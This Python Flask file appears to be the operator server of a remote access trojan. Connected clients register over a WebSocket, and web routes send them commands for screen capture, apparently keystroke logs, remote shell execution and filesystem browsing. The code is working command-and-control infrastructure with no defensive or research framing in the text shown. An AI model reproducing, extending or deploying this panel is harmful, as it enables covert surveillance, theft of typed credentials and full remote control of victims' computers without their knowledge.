import base64
import datetime
import json
import lzma
import sys
from flask import Flask, jsonify, request, render_template
from flask_sockets import Sockets
from tempfile import NamedTemporaryFile
import time

app = Flask(__name__)
sockets = Sockets(app)
cache = {}


@app.errorhandler
def errorhandler(err):
    return jsonify({"code": err})


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/api.json')
def api():
    return jsonify({"code": 0, "data": [{"uid": i, "system": cache[i][1], "disk": cache[i][2], "uptime": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")} for i in cache.keys()]})


@sockets.route("/ping")
def ping(ws):
    msg = json.loads(ws.receive())
    uid = msg['uid']
    cache.update({uid: [ws, msg["system"], msg["disk"]]})
    try:
        while not ws.closed:
            time.sleep(10)
    except Exception as e:
        pass
    finally:
        cache.pop(uid)
        print("close..")


@app.route('/capture/<uid>', methods=['GET', 'POST'])
def capture(uid):
    if request.method == "GET":
        return render_template('capture.html')
    else:
        ws = cache[uid][0]
        ws.send(json.dumps({"v_uid": "0222", "type": "capture"}))
        msg = json.loads(ws.receive())
        return jsonify(msg)


@app.route('/key/<uid>', methods=['GET', 'POST'])
def key(uid):
    ws = cache[uid][0]
    ws.send(json.dumps({"v_uid": "0222", "type": "key"}))
    msg = json.loads(ws.receive())
    code = base64.b64decode(msg["data"]).decode()
    return render_template('key.html', code=code)


@app.route('/shell/<uid>', methods=['GET', 'POST'])
def shell(uid):
    if request.method == "GET":
        return render_template('shell.html')
    else:
        ws = cache[uid][0]
        _key = json.loads(request.data.decode())["data"]
        ws.send(json.dumps({"v_uid": "0222", "type": "shell", "data": _key}))
        msg = json.loads(ws.receive())
        return jsonify(msg)


@app.route('/file/<uid>', methods=['GET', 'POST'])
def file(uid):
    if request.method == "GET":
        return render_template('file.html', disk_root=[{"title": e_disk_path, "id": e_disk_path} for e_disk_path in cache[uid][2]])
    else:
        ws, disk = cache[uid][0], cache[uid][2]
        _dir = request.form.get("dir")
        ws.send(json.dumps({"v_uid": "0222", "type": "dir", "data": _dir}))
        msg = json.loads(ws.receive())
        return jsonify({"code": 0, "data": msg["raw"]})


if __name__ == '__main__':
    from gevent import pywsgi
    from geventwebsocket.handler import WebSocketHandler
    from gevent import monkey

    monkey.patch_all()
    server = pywsgi.WSGIServer(('0.0.0.0', 5000), app, handler_class=WebSocketHandler)
    print("server run at", "http://127.0.0.1:5000")
    try:
        server.serve_forever()
    except KeyboardInterrupt as e:
        server.stop()
        sys.exit()
